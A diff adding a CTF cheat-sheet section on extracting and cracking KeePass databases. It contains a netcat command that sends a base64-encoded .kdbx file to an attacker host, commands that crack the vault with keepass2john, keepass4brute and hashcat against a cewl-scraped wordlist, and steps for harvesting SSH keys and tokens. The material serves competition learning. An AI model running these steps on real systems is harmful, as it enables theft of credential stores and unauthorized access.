@@ -12,6 +12,7 @@
 - [ROT18 Decoding](#rot18-decoding)
 - [Common Encodings](#common-encodings)
 - [Git Directory Recovery (UTCTF 2024)](#git-directory-recovery-utctf-2024)
+- [KeePass Database Extraction and Cracking (H7CTF 2025)](#keepass-database-extraction-and-cracking-h7ctf-2025)
 
 ---
 
@@ -225,3 +226,51 @@ cat .git/logs/HEAD
 ```
 
 **Tool:** `gitdumper.sh` from internetwache/GitTools is most reliable.
+
+---
+
+## KeePass Database Extraction and Cracking (H7CTF 2025)
+
+**Pattern (Moby Dock):** KeePass database (`.kdbx`) found on compromised system contains SSH keys or credentials for lateral movement.
+
+**Transfer from remote system:**
+```bash
+# On target: base64 encode and send via netcat
+base64 .system.kdbx | nc attacker_ip 4444
+
+# On attacker: receive and decode
+nc -lvnp 4444 > kdbx.b64 && base64 -d kdbx.b64 > system.kdbx
+```
+
+**Cracking KeePass v4 databases:**
+```bash
+# Standard keepass2john (KeePass v3 only)
+keepass2john system.kdbx > hash.txt
+
+# For KeePass v4 (KDBX 4.x with Argon2): use custom fork
+git clone https://github.com/ivanmrsulja/keepass2john.git
+cd keepass2john && make
+./keepass2john system.kdbx > hash.txt
+
+# Alternative: keepass4brute (direct brute-force)
+python3 keepass4brute.py -d wordlist.txt system.kdbx
+```
+
+**Wordlist generation from challenge context:**
+```bash
+# Generate wordlist from related website content
+cewl http://target:8080 -d 2 -m 5 -w cewl_words.txt
+
+# Add theme-related keywords manually
+echo -e "expectopatronum\nharrypotter\nalohomora" >> cewl_words.txt
+
+# Crack with hashcat (Argon2 = mode 13400)
+hashcat -m 13400 hash.txt cewl_words.txt
+```
+
+**After cracking — extract credentials:**
+1. Open `.kdbx` in KeePassXC with recovered password
+2. Check all entries for SSH private keys, passwords, API tokens
+3. SSH keys are typically stored in the "Notes" or "Advanced" attachment fields
+
+**Key insight:** Standard `keepass2john` does not support KeePass v4 (KDBX 4.x) databases that use Argon2 key derivation. Use the `ivanmrsulja/keepass2john` fork or `keepass4brute` for v4 support. Generate context-aware wordlists with `cewl` targeting related web services.
